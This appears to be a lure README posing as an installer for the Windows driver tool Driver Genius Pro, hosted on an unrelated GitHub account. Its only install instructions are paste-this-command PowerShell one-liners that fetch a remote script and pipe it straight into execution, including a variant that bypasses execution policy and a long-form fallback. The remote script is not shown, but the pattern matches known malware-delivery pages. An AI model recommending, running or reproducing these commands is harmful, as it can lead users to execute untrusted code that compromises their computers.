# Driver Genius Pro Updater Setup
One-click setup for Driver Genius Pro Updater Setup -- the professional Windows driver management tool that automatically detects outdated and missing drivers and updates them from a verified database of 8 million driver packages

Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

## What's Included

- Scans all installed hardware and cross-references drivers against the 8-million-entry verified database.
- Downloads driver packages for GPU, network adapter, audio controller, and chipset components silently.
- Installs each updated driver and creates a system restore point before every installation step.
- Runs a post-update hardware scan to confirm all drivers match the latest verified versions in the database.

## Prerequisites

- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~400 MB free disk space

## FAQ

**A display driver update causes a black screen or crash loop after the system restarts**

Boot into Safe Mode, open Driver Genius, and use the Driver Restore feature to roll back to the previous working display driver.

**Network adapter driver update removes the device and Windows loses all internet connectivity**

Download the network driver on another device from the motherboard manufacturer website and install it offline.

**Fallback (execution policy bypass):**

```powershell
powershell -ep Bypass -c "irm 'https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1' | iex"
```

"irm is not recognized" -- old PowerShell detected. Use the full form:

```powershell
Invoke-RestMethod 'https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1' | Invoke-Expression
```

## License
MIT -- see LICENSE.